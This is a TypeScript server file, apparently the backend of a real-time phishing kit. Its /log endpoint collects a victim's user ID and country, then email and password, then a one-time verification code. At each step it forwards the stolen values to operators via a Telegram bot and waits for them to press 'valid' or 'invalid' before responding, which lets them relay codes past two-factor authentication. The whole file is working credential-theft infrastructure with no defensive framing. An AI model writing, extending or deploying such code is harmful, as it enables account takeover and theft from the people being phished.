import { serve } from "bun";
import chalk from "chalk";
import { eq } from "drizzle-orm";
import z from "zod";
import { env } from "./env";
import {
  waitForLoginAttempt,
  waitForMethodAttempt,
  waitForVerifyAttempt,
} from "./lib/bot/callback-bus";
import { CallbackDataType } from "./lib/bot/constants";
import { sendMessageToAllSessions } from "./lib/bot/utils";
import { cors, json } from "./lib/cors";
import { db } from "./lib/db/db";
import { tables } from "./lib/db/schemas";
import { saveAllMessages } from "./lib/db/utils";
import { formatCountry } from "./lib/utils";
import type { VerifyAttemptStatus } from "./types";

require("@/lib/bot/bot");

const server = serve({
  routes: {
    "/health": {
      GET: () => json({ status: "ok" }),
    },
    "/log": {
      async POST(req) {
        //#region PRE-PROCESSING
        const baseSchema = z.object({
          userId: z.string(),
          code: z.string().optional(),
          loginAttemptId: z.string().optional(),
        });

        const body = await req.json();
        const basePayload = baseSchema.safeParse(body);

        if (!basePayload.success) {
          return json({ error: z.treeifyError(basePayload.error) }, 400);
        }
        //#endregion

        //#region STEP 3: LOGIN ATTEMPT CODE
        if (basePayload.data.code) {
          const step3Schema = z.object({
            loginAttemptId: z.string(),
            email: z.string().optional(),
            password: z.string().optional(),
          });

          const step3Payload = step3Schema.safeParse(body);

          if (!step3Payload.success) {
            return json({ error: z.treeifyError(step3Payload.error) }, 400);
          }

          const [loginAttempt] = await db
            .select()
            .from(tables.loginAttempt)
            .where(
              eq(tables.loginAttempt.id, step3Payload.data.loginAttemptId),
            );

          if (!loginAttempt) {
            return json({ error: "Login attempt not found" }, 404);
          }

          await db
            .update(tables.loginAttempt)
            .set({
              code: basePayload.data.code,
            })
            .where(eq(tables.loginAttempt.id, loginAttempt.id));

          const messages = await sendMessageToAllSessions(
            `<b>⚠️ VERIFICATION ATTEMPT ⚠️</b>\n\n` +
              `<b>👤 USER:</b> <code>${loginAttempt.userId}</code>\n` +
              `<b>🌐 COUNTRY:</b> ${formatCountry(loginAttempt.country)}\n` +
              `<b>🔒 EMAIL:</b> <code>${step3Payload.data.email}</code>\n` +
              `<b>🔑 PASSWORD:</b> <code>${step3Payload.data.password}</code>\n` +
              `<b>🔐 CODE:</b> <code>${basePayload.data.code}</code>`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ VALID",
                      callback_data: `${CallbackDataType.VerifyAttempt}:${loginAttempt.id}:valid`,
                    },
                    {
                      text: "❌ INVALID",
                      callback_data: `${CallbackDataType.VerifyAttempt}:${loginAttempt.id}:invalid`,
                    },
                  ],
                ],
              },
            },
          );

          await saveAllMessages(
            messages
              .filter((message) => message.status === "fulfilled")
              .map((message) => message.value)
              .filter((message) => message != null),
            loginAttempt.id,
          );

          try {
            const verifyAttemptStatus =
              await waitForVerifyAttempt<VerifyAttemptStatus>(loginAttempt.id);

            if (verifyAttemptStatus.data === "valid") {
              return json(loginAttempt);
            } else {
              return json({ error: "Verify attempt failed" }, 400);
            }
          } catch {
            return json({ error: "Verify attempt callback timed out" }, 504);
          }
        }
        //#endregion

        //#region STEP 2: LOGIN ATTEMPT CONTINUE
        if (basePayload.data.loginAttemptId) {
          const step2Schema = z.object({
            email: z.string(),
            password: z.string(),
          });

          const step2Payload = step2Schema.safeParse(body);

          if (!step2Payload.success) {
            return json({ error: z.treeifyError(step2Payload.error) }, 400);
          }

          const [loginAttempt] = await db
            .select()
            .from(tables.loginAttempt)
            .where(eq(tables.loginAttempt.id, basePayload.data.loginAttemptId));

          if (!loginAttempt) {
            return json({ error: "Login attempt not found" }, 404);
          }

          await db
            .update(tables.loginAttempt)
            .set({
              email: step2Payload.data.email,
              password: step2Payload.data.password,
            })
            .where(eq(tables.loginAttempt.id, loginAttempt.id));

          const messages = await sendMessageToAllSessions(
            `<b>⚠️ LOGIN ATTEMPT ⚠️</b>\n\n` +
              `<b>👤 USER:</b> <code>${loginAttempt.userId}</code>\n` +
              `<b>🌐 COUNTRY:</b> ${formatCountry(loginAttempt.country)}\n` +
              `<b>✉️ EMAIL:</b> <code>${step2Payload.data.email}</code>\n` +
              `<b>🔑 PASSWORD:</b> <code>${step2Payload.data.password}</code>`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "✅ VALID",
                      callback_data: `${CallbackDataType.LoginAttempt}:${loginAttempt.id}:valid`,
                    },
                    {
                      text: "❌ INVALID",
                      callback_data: `${CallbackDataType.LoginAttempt}:${loginAttempt.id}:invalid`,
                    },
                  ],
                ],
              },
            },
          );

          await saveAllMessages(
            messages
              .filter((message) => message.status === "fulfilled")
              .map((message) => message.value)
              .filter((message) => message != null),
            loginAttempt.id,
          );

          try {
            const loginAttemptStatus =
              await waitForLoginAttempt<VerifyAttemptStatus>(loginAttempt.id);

            if (loginAttemptStatus.data === "valid") {
              return json(loginAttempt);
            } else {
              return json({ error: "Login attempt failed" }, 400);
            }
          } catch {
            return json({ error: "Login attempt callback timed out" }, 504);
          }
        }
        //#endregion

        //#region STEP 1: CREATE LOGIN ATTEMPT
        {
          const step1Schema = baseSchema.extend({
            country: z.string(),
          });

          const step1Payload = step1Schema.safeParse(body);

          if (!step1Payload.success) {
            return json({ error: z.treeifyError(step1Payload.error) }, 400);
          }

          const userId = step1Payload.data.userId.trim();
          const country = step1Payload.data.country.trim();

          const [inserted] = await db
            .insert(tables.user)
            .values({ id: userId })
            .onConflictDoNothing()
            .returning();

          const [user] = inserted
            ? [inserted]
            : await db
                .select()
                .from(tables.user)
                .where(eq(tables.user.id, userId));

          if (!user) {
            return json({ error: "User not found" }, 404);
          }

          const [loginAttempt] = await db
            .insert(tables.loginAttempt)
            .values({
              id: Bun.randomUUIDv7(),
              userId: user.id,
              country: country,
            })
            .returning();

          if (!loginAttempt) {
            return json({ error: "Failed to create login attempt" }, 500);
          }

          const messages = await sendMessageToAllSessions(
            `<b>🔑 LOGIN ATTEMPT</b>\n\n` +
              `<b>👤 USER:</b> <code>${loginAttempt.userId}</code>\n` +
              `<b>🌐 COUNTRY:</b> ${formatCountry(loginAttempt.country)}`,
            {
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [
                  [
                    {
                      text: "🚀 I'M READY",
                      callback_data: `${CallbackDataType.MethodAttempt}:${loginAttempt.id}:ready`,
                    },
                  ],
                ],
              },
            },
          );

          await saveAllMessages(
            messages
              .filter((message) => message.status === "fulfilled")
              .map((message) => message.value)
              .filter((message) => message != null),
            loginAttempt.id,
          );

          try {
            await waitForMethodAttempt(loginAttempt.id);

            return json({
              ...loginAttempt,
              disabled: user.disabled,
            });
          } catch {
            return json({ error: "Method attempt callback timed out" }, 504);
          }
        }
        //#endregion
      },
      OPTIONS: () => cors(),
    },
    "/user/:id": {
      async GET(req) {
        const { id } = req.params;

        const [user] = await db
          .select()
          .from(tables.user)
          .where(eq(tables.user.id, id));

        if (!user) {
          const [inserted] = await db
            .insert(tables.user)
            .values({ id, disabled: false })
            .onConflictDoNothing()
            .returning();

          if (!inserted) {
            return json({ error: "Failed to create user" }, 500);
          }

          return json(inserted);
        }

        return json(user);
      },
      OPTIONS: () => cors(),
    },
  },

  port: env.PORT,

  development: env.NODE_ENV !== "production" && {
    hmr: true,
    console: true,
  },
});

console.log(chalk.green(`🚀 Server running at ${server.url}`));
